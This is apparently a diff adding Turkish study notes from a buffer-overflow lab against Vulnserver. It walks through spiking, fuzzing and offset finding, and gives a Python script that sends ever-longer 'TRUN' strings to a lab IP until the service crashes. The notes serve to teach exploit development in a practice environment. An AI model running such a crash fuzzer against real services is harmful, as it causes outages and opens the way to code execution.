@@ -1,0 +1,123 @@
+Kali'deki terminale bakarsan fuzzing yazdığını görürsün.
+Fuzzing : Farklı farklı birden çok karakter, veri yollayarak nerede sıkıntı çıkartabiliriz işlemi.
+Fuzzing yapan ve tam nerede taşma oluyor vs. bildiren python kodu yazacağız.
+Karşı tarafa, sunucuya bağlanacağız ve bağlandıktan sonra bazı veriler yollayacağız.
+
+Şimdilik adımlar:
+
+1) Spiking ile çökertebiliyor muyuz bakarız.
+
+2) Fuzzing ile kaç karakter civarı çökertiyoruz görürüz.
+
+3) Offset ile gerçekten kaçıncı karakter (EIP'ye gelebilmek için) tam olarak öğreniriz.
+
+
+
+
+FUZZING
+-------
+import socket   ---> karşı server'a bağlanmak için
+
+stringToSend = "TRUN /.:/" + "A" * 2000 ---> Karşı server'a yollayacağımız string.
+                                        ---> Sistemin algılaması için generic_tcp_send programı sondaki işaretleri                                           koyar. O yüzden biz de aynı işaretleri koyuyoruz ve 2000 tane A yolluyoruz.
+                                        ---> 2000 A yolladık baktık çökmedi. Gelip değiştiririz 5000 yaptık çökmedi                                         10 000 yaptık çöktü. O zaman 5 000 - 10 000 arasında çöküyor deriz ve 6000,                                          7000 diye test etmeye başlarız. Bunu bu tarz yapmak yerine bunu programa                                             yaptırsak daha kolay olur. O sebeple ilk başta sayıyı küçük tutarız ve                                               arttırarak götürürüz. 
+
+
+
+
+
+DÜZENLEME
+---------
+import socket
+
+numberOfCharacters = 100
+stringToSend = "TRUN /.:/" + "A" * numberOfCharacters
+
+while True:
+   try:
+      mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      mySocket.connect(("10.0.2.15", 9999))
+      mySocket.send(stringToSend)   ---> python2'de sorun değil ama 3'te bytes istiyorum string veriyorsun der
+
+
+
+
+
+
+
+
+DÜZENLEME
+---------
+import socket
+from time import sleep
+import sys ---> sistemi kapatmak için
+
+numberOfCharacters = 100
+stringToSend = "TRUN /.:/" + "A" * numberOfCharacters
+
+while True:
+   try:
+      mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      mySocket.connect(("10.0.2.15", 9999))
+      bytes = stringToSend.encode(encoding="latin1")   ---> encode yaptığın şey dataya çevrilir.
+                                                            utf-8, textleri textlere veya bytelara çeviren sistem
+                                                            utf-8 hexadecimal değerlerde çalışmaz.
+                                                            latin1 encodingi bu programla en iyi uyan
+                                                            her program için bu değişebilir
+                                                            encoding = karakter kodlaması
+
+      mySocket.send(bytes)
+      mySocket.close()
+
+      stringToSend = stringToSend + "A" * numberOfCharacters  ---> her seferinde 100 tane daha ekleriz
+
+      sleep(1)   ---> Çok hızlı çökmeler olmasın diye.
+                      Koruma vs. olur. O sebepten 1 saniye beklemeden bir sürü karakter yollamak programlarda başka                      şeyleri tetikleyebilir.
+
+   except KeyboardInterrupt:
+      print("Crashed at: " + str(len(stringToSend)))   ---> stringToSend bir string ve yüzer artarak gidiyor
+                                                            kaç tane arttı onu bulacağız
+                                                            kesin sonuç bulamayız
+      sys.exit()
+ 
+   except Exception as e:
+      print("Crashed at: " + str(len(stringToSend)))
+      print(e)    ---> Hatayı görebilmek için.
+      sys.exit()
+
+
+WINDOWS'TA SADECE VULNSERVER'I AÇIYORUZ.
+IMMUNITY DEBUGGER'I AÇMAMIZA GEREK YOK. ZATEN NEREDE ÇÖKTÜĞÜNÜ VS. KODUMUZDA BİZE VERECEK.
+VULNSERVER'I AÇTIKTAN SONRA KODUMUZU ÇALIŞTIRABİLİRİZ VE FUZZING OLDUĞUNU GÖRÜRÜZ. 
+VULNSERVER'DA İSTEKLERİN GELDİĞİNİ GÖRÜRÜZ.
+ÇÖKÜNCE VULNSERVER KAPANIR.
+KALİ TERMİNALİMİZDE ÇÖKERTTİĞİMİZ SAYIYI GÖRÜRÜZ: 2309 (KENDİLİĞİNDEN KAPANMAZSA CTRL+C DE YAPABİLİRSİN)
+2309 TAM DOĞRU OLMAYABİLİR. TEST ETMELİYİZ.
+2309'DA TAM OLARAK EIP'YE ULAŞACAĞIZ VE ORADAN ŞU İŞLEMLERİ YAPABİLECEĞİZ GİBİ BİR DURUM SÖZ KONUSU DEĞİL. 
+ÇÜNKÜ YÜZER YÜZER YOLLADIK VE BELKİ ÇÖKTÜĞÜ ANI KAÇIRDIK BİR DAHA YOLLADIK VS. YANİ TAM NET DEĞİL.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
